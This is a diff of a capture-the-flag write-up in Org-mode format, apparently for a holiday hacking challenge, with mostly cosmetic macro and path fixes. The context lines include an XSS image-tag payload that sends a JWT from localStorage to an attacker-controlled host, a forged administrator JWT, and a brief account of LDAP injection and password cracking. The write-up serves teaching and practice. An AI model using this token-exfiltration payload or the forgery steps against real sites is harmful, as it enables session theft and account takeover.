@@ -48,7 +48,7 @@ This blog post is explicitly called out:
    :CUSTOM_ID: q8_goal
    :END:
 
-The hints lay out a pretty clear path: we can use {{abbr(Cross-site Scripting, XSS)}} to send a malicious request to one of the elves or
+The hints lay out a pretty clear path: we can use {{{abbr(Cross-site Scripting, XSS)}}} to send a malicious request to one of the elves or
 reindeer, and then steal their JWT token and access the directory.
 
 * Approach
@@ -58,13 +58,13 @@ reindeer, and then steal their JWT token and access the directory.
 
 ** Cross-Site Scripting
 
-The first stage of this attack is our malicious {{abbr(Cross-site Scripting, XSS)}} request. First, we tried to steal the cookie, but in reviewing the code at http://edb.northpolechristmastown.com, we noticed that we needed to steal the token out of local storage:
+The first stage of this attack is our malicious {{{abbr(Cross-site Scripting, XSS)}}} request. First, we tried to steal the cookie, but in reviewing the code at http://edb.northpolechristmastown.com, we noticed that we needed to steal the token out of local storage:
 
 #+BEGIN_SRC js
 token = localStorage.getItem("np-auth");
 #+END_SRC
 
-A classic {{abbr(Cross-site Scripting, XSS)}} attack is using the HTML =IMG= tag, and causing Javascript code to run and leak the token to a server we control. This is just one of many options in the [[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet][OWASP Cheat Sheet]].
+A classic {{{abbr(Cross-site Scripting, XSS)}}} attack is using the HTML =IMG= tag, and causing Javascript code to run and leak the token to a server we control. This is just one of many options in the [[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet][OWASP Cheat Sheet]].
 
 #+BEGIN_SRC html
 <IMG SRC=/ onerror="document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');">
@@ -209,7 +209,7 @@ Why, this looks pretty similar to what the blog post has. On a lark, let's see w
 That worked. We got a list with elves, reindeers -- even administrators! Now that we have some information on Santa, let's change our cookie to his, and access the Santa Panel:
 
 #+BEGIN_SRC 
-.make_jwt.py santa.claus administrators human
+./make_jwt.py santa.claus administrators human
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiYWRtaW5pc3RyYXRvcnMiLCJvdSI6Imh1bWFuIiwidWlkIjoic2FudGEuY2xhdXMiLCJleHBpcmVzIjoiMjAxOC0wOC0xNiAxMjowMDo0Ny4yNDgwOTMrMDA6MDAifQ.JQ16hqPVuXmJDqA5PgZ4jMwn9RRQAuPuJhNsXfC5ZYk
 #+END_SRC
 
@@ -247,7 +247,7 @@ Armed with that password, we can access the Santa Panel, where we find:
    :CUSTOM_ID: q8_solution
    :END:
 
-There was a lot of stuff going on in this question. First, we needed to use {{abbr(Cross-site Scripting, XSS)}} to grab a copy of the JWT token, then we had to recover the secret and forge a new token.
+There was a lot of stuff going on in this question. First, we needed to use {{{abbr(Cross-site Scripting, XSS)}}} to grab a copy of the JWT token, then we had to recover the secret and forge a new token.
 
 Once we logged into the system, we found it was vulnerable to LDAP injection, and were able to dump all the users, and their passwords. Cracking Santa's password allowed us to access the letter from the Wizard of Oz.
 
@@ -273,7 +273,7 @@ $ ./edb.py | head
    :CUSTOM_ID: q8_alternatives
    :END:
 
-The website's =robots.txt= page lists a single entry, http://edb.northpolechristmastown.com/dev/, which leads us to this {{abbr(LDAP Data Interchange Format, LDIF)}} file:
+The website's =robots.txt= page lists a single entry, http://edb.northpolechristmastown.com/dev/, which leads us to this {{{abbr(LDAP Data Interchange Format, LDIF)}}} file:
 
 #+BEGIN_SRC 
 #LDAP LDIF TEMPLATE
